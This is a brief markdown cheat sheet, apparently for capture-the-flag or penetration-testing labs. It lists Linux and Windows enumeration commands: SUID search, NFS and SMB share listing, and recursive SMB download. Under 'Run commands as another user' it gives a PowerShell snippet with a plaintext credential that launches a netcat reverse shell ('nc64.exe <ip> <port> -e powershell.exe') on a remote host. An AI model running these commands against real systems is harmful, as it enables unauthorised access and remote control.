# Enumeration

## Linux

### SUID - GUID
```bash
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null
```

### NFS

```bash
#show all mounted shares
mount
```

```bash
# Show mountable shares on 192.168.1.42
showmount -e 192.168.1.42
```

## Windows

### Groups
```powershell
whoami /all
```

### SMB
```bash
smbclient --no-pass -L //10.10.10.42/
smbclient //10.10.10.42/C$ -U hermes
```
- Recursively download directories
```powershell
mask ""
recurse on
prompt off
mget *
```

### Run commands as another user

```powershell
$username="hermes"
$password="asaboveasbelow"
$securePassword=ConvertTo-SecureString $password -AsPlainText -Force
$Credential=New-Object System.Management.Automation.PSCredential($username, $securePassword)
New-PSSession -Credential $Credential | Enter-PSSession

Invoke-Command -ComputerName proteus -Credential $credential -ScriptBlock {C:\hermes\nc64.exe <ip> <port> -e powershell.exe}
```

### Find a file

```powershell
dir flag.txt /s /p
```